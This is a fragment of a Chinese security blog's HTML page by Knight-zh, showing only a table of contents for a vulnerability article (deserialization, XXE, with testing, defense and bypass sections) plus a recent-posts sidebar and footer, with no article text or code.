href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-8"><span class="toc-number">1.11.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-6"><span class="toc-number">1.11.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-8"><span class="toc-number">1.11.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-6"><span class="toc-number">1.11.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-7"><span class="toc-number">1.11.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-7"><span class="toc-number">1.11.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-7"><span class="toc-number">1.11.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-8"><span class="toc-number">1.11.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.12.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-9"><span class="toc-number">1.12.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-7"><span class="toc-number">1.12.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-9"><span class="toc-number">1.12.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-7"><span class="toc-number">1.12.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-8"><span class="toc-number">1.12.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-8"><span class="toc-number">1.12.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-8"><span class="toc-number">1.12.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-9"><span class="toc-number">1.12.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">1.13.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-10"><span class="toc-number">1.13.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-10"><span class="toc-number">1.13.2.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-8"><span class="toc-number">1.13.3.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-8"><span class="toc-number">1.13.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-9"><span class="toc-number">1.13.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-9"><span class="toc-number">1.13.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-9"><span class="toc-number">1.13.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-10"><span class="toc-number">1.13.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A5%E7%AB%99%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.</span> <span class="toc-text">日站实践</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/04/23/docker%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="docker的使用教程"><img src="https://images.pexels.com/photos/4245826/pexels-photo-4245826.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="docker的使用教程"/></a><div class="content"><a class="title" href="/2021/04/23/docker%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="docker的使用教程">docker的使用教程</a><time datetime="2021-04-22T22:33:34.000Z" title="发表于 2021-04-23 06:33:34">2021-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/23/%E6%BC%8F%E6%B4%9E%E7%AF%87/" title="漏洞篇"><img src="https://images.pexels.com/photos/1529881/pexels-photo-1529881.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞篇"/></a><div class="content"><a class="title" href="/2021/04/23/%E6%BC%8F%E6%B4%9E%E7%AF%87/" title="漏洞篇">漏洞篇</a><time datetime="2021-04-22T21:42:13.000Z" title="发表于 2021-04-23 05:42:13">2021-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/23/HW%E6%80%BB%E7%BB%93/" title="HW总结"><img src="https://images.pexels.com/photos/1274260/pexels-photo-1274260.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HW总结"/></a><div class="content"><a class="title" href="/2021/04/23/HW%E6%80%BB%E7%BB%93/" title="HW总结">HW总结</a><time datetime="2021-04-22T20:48:24.000Z" title="发表于 2021-04-23 04:48:24">2021-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/20/hello-world/" title="Hello World"><img src="https://images.pexels.com/photos/1988681/pexels-photo-1988681.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/04/20/hello-world/" title="Hello World">Hello World</a><time datetime="2021-04-20T14:47:46.746Z" title="发表于 2021-04-20 22:47:46">2021-04-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Knight-zh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,welcome to  my blog,salute!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>